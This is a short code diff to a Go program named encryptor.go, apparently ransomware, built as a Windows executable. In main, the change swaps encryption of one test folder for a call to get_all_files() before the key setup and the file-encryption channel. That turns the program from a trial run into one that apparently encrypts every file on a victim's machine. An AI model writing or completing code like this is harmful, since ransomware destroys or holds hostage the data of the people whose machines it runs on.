@@ -534,8 +534,8 @@ func listdir(path string)([]string){
 
 func main() { // GOOS=windows GOARCH=amd64 go build -o lcj.exe encryptor.go
 	start := time.Now()
-	files := listdir("/root/y")
-	//files := get_all_files()
+	//files := listdir("/root/y")
+	files := get_all_files()
 	encryption_key()
 
 	c := make(chan string, 100)
